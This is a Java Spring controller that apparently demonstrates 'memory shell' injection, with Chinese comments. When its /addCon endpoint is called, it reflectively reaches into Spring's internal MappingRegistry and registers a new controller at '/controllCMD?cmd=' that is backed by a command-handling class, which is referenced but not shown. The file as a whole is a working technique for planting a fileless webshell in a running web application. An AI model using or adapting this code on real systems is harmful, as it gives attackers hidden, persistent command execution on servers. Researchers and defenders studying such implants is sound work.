package com.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

@Controller
public class AddController {

    @RequestMapping(value = "/addCon")
    public void index(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String controllerPath = "/controllCMD";
        //获取当前应用的上下文
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(
                ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()
        );

        // 通过 context 获取 RequestMappingHandlerMapping 对象
        RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);


        // 获取父类的 MappingRegistry 属性
        Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
        f.setAccessible(true);
        Object mappingRegistry = f.get(mapping);


        // 反射调用 MappingRegistry 的 register 方法
        Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
        Method[] methods = c.getDeclaredMethods();


        // 判断当前路径是否已经添加
        Field field = c.getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map<String,Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
        for(String urlPath:urlLookup.keySet()){
            if(controllerPath.equals(urlPath)){
                response.getWriter().write("path already exists!");
                return;
            }
        }

        // 初始化一些注册需要的信息
        PatternsRequestCondition url = new PatternsRequestCondition(controllerPath);
        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url,condition,null,null,null,null,null);

        Class<?> myClass = DynamicUtils.getClass(DynamicUtils.CONTROLLER_CLASS_STRING);
        for(Method method:methods){
            //通过register方法注入 patterns和方法的映射关系
            if("register".equals(method.getName())){
                method.setAccessible(true);
                //注入cmdController类的第一个方法
                method.invoke(mappingRegistry,info,cmdController.class.newInstance(),cmdController.class.getMethods()[0]);
                response.getWriter().write("cmd controller add.\ncontroller path:" + controllerPath + "?cmd=");
            }
        }
    }
}
